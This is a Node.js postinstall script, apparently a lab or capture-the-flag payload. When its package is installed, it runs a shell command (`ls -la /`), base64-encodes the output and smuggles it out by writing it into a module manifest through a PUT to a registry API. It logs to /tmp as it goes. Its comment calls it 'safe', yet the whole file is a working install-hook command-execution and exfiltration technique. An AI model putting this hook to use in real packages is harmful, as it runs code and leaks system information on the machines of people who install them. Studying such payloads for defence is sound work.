// postinstall.js
// Safe postinstall: run `ls -la /`, base64-encode, and PUT into the module manifest
// Adjust MODULE_ID and REGISTRY_HOST/PORT below as required.

const { execSync } = require('child_process');
const http = require('http');

const MODULE_ID = 'ECT-987654';       // <- replace with the real module id
const REGISTRY_HOST = '127.0.0.1';    // <- replace if different
const REGISTRY_PORT = 3000;           // <- replace if different
const REGISTRY_PATH = `/api/modules/${MODULE_ID}`;

try {
  // 1) run ls (capture stdout/stderr)
  const rawOut = execSync('ls -la / 2>&1', { timeout: 30_000 }).toString('utf8');

  // 2) base64-encode (single-line)
  const b64 = Buffer.from(rawOut, 'utf8').toString('base64');

  // 3) build a YAML-ish manifest string (adjust wrapper if your API expects a different shape)
  const manifestYaml = `name: "Siren's Lament"\ninstall_output_b64: "${b64}"\n`;

  const body = JSON.stringify({ manifest: manifestYaml });

  // 4) PUT to the registry API
  const opts = {
    hostname: REGISTRY_HOST,
    port: REGISTRY_PORT,
    path: REGISTRY_PATH,
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    },
    timeout: 10_000
  };

  const req = http.request(opts, (res) => {
    // optional small debug file so you can inspect that the PUT happened
    try {
      require('fs').writeFileSync('/tmp/postinstall_put_status', `status:${res.statusCode}`, 'utf8');
    } catch(e){}
    // optionally read response (drain)
    res.on('data', ()=>{});
    res.on('end', ()=>{});
  });

  req.on('error', (err) => {
    try { require('fs').writeFileSync('/tmp/postinstall_put_error', String(err), 'utf8'); } catch(e){}
  });

  req.write(body);
  req.end();
} catch (err) {
  // write any exec errors to /tmp for debugging
  try { require('fs').writeFileSync('/tmp/postinstall_exec_error', String(err), 'utf8'); } catch(e){}
}
